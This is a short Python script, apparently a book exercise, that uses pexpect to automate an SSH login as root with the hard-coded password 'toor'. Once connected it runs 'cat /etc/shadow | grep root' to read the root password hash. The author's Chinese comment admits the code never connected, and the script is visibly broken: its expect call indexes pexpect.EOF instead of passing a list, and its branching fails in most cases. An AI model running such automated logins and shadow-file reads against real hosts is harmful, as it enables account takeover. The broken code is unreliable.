#!/bin/env python3
# -*- coding: utf-8 -*-
# version: Python3.X
"""
2017.01.31 进行 ssh 连接, [PS] 自己试了书中的代码没法成功连接上, 所以就仅供参考了
"""
import pexpect

__author__ = '__L1n__w@tch'

PROMPT = ["# ", ">>> ", "> ", "\$ "]


def send_command(child, cmd):
    child.sendline(cmd)
    child.expect(PROMPT)
    print(child.before)


def connect(user, host, password):
    ssh_new_key = "Are you sure you want to continue connecting"
    conn_str = "ssh {}@{}".format(user, host)
    child = pexpect.spawn(conn_str)
    ret = child.expect(pexpect.EOF[pexpect.TIMEOUT, ssh_new_key, "{}@{}'s password:".format(user, host)])

    if ret == 0:
        print("[-] Error Connecting")
        exit(-1)
    elif ret == 1:
        child.sendline("yes")
        ret = child.expect([pexpect.TIMEOUT, "[P|p]assword:", pexpect.EOF])
        if ret == 0:
            print("[-] Error Connecting")
            exit(-1)
        child.sendline(password)
        child.expect(PROMPT)
        return child
    else:
        print(child)
    exit(-1)


if __name__ == "__main__":
    child = connect("root", "192.168.158.157", "toor")
    send_command(child, "cat /etc/shadow | grep root")
